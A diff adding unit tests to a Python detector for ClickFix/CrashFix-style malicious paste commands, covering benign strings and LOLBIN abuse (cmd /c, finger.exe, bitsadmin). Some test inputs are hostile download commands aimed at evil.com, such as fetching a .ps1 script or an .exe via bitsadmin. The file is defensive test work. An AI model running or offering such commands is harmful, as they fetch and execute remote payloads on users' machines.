@@ -80,6 +80,25 @@ class TestClean(unittest.TestCase):
         # Fewer than 10 comma-separated numbers should NOT trigger
         self.assertIsNone(check_for_suspicious_content("1, 2, 3, 4, 5"))
 
+    def test_bare_cmd_c_alone(self):
+        # cmd /c alone is medium — needs a second signal to trigger
+        self.assertIsNone(check_for_suspicious_content("cmd /c"))
+
+    def test_cmd_exe_only(self):
+        # cmd.exe without /c should not trigger
+        self.assertIsNone(check_for_suspicious_content("cmd.exe"))
+
+    def test_bare_cscript_alone(self):
+        self.assertIsNone(check_for_suspicious_content("cscript"))
+
+    def test_bare_regsvr32_alone(self):
+        self.assertIsNone(check_for_suspicious_content("regsvr32"))
+
+    def test_numeric_blob_alone(self):
+        # 10+ comma-separated numbers without any other signal should NOT trigger
+        blob = ",".join(str(i) for i in range(100, 115))
+        self.assertIsNone(check_for_suspicious_content(blob))
+
 
 class TestSuspicious(unittest.TestCase):
     """Content that SHOULD trigger a warning."""
@@ -220,6 +239,20 @@ class TestRealisticPayloads(unittest.TestCase):
 class TestCrashFixDetection(unittest.TestCase):
     """CrashFix ClickFix variant — finger.exe LOLBIN and charcode obfuscation (issue #17)."""
 
+    # --- cmd /c and cmd.exe /c ---
+
+    def test_cmd_c_with_payload_url(self):
+        # cmd /c (medium) + .ps1 URL (medium) = trigger
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd /c curl https://evil.com/setup.ps1"
+        ))
+
+    def test_cmd_exe_slash_c(self):
+        # cmd.exe /c should also be detected (medium)
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd.exe /c bitsadmin /transfer job http://evil.com/evil.exe"
+        ))
+
     # --- finger.exe LOLBIN ---
 
     def test_finger_exe_with_user_at_host(self):
@@ -238,6 +271,12 @@ class TestCrashFixDetection(unittest.TestCase):
         # finger.exe (medium) + payload URL (medium) = should trigger
         self.assertIsNotNone(check_for_suspicious_content(
             "finger.exe && https://evil.com/script.ps1"
+        ))
+
+    def test_finger_exe_plus_cmd_c(self):
+        # finger.exe (medium) + cmd /c (medium) = trigger
+        self.assertIsNotNone(check_for_suspicious_content(
+            "cmd /c finger.exe"
         ))
 
     # --- Broader LOLBINs ---
